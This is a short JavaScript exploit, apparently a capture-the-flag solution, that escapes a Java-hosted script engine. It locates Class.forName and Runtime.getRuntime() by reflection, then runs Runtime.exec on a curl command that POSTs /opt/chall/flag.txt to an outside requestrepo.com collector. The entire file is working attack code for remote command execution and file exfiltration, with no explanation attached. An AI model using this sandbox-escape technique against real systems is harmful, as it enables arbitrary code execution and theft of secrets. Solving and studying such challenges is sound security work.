function getIndexOfMethod(methodArray, methodName){
    var count = 0;
    for each(var method in methodArray){
        if(method.toString() == methodName){
            return count;
        }
        count++;
    }
    return null;
}

// Modify the command
var command = "curl -X POST -d @/opt/chall/flag.txt http://6gmo9p4b.requestrepo.com";

// Create an instance of class 'Class'
var obj = ''['class'];

// Get the list of all the methods
var methods = obj.getClass().getMethods();

// Find the index of 'forName()' method
var forNameString = "public static java.lang.Class java.lang.Class.forName(java.lang.String) throws java.lang.ClassNotFoundException";
var forNameMethodIndex = getIndexOfMethod(methods, forNameString);

// Find the index of 'getRuntime()' method
var runTimeMethods = methods[forNameMethodIndex].invoke(null, 'java.lang.Runtime').getMethods();
var getRuntimeString = "public static java.lang.Runtime java.lang.Runtime.getRuntime()";
var getRunTimeMethodIndex = getIndexOfMethod(runTimeMethods, getRuntimeString);

// Execute the command
runTimeMethods[getRunTimeMethodIndex].invoke(null).exec(command);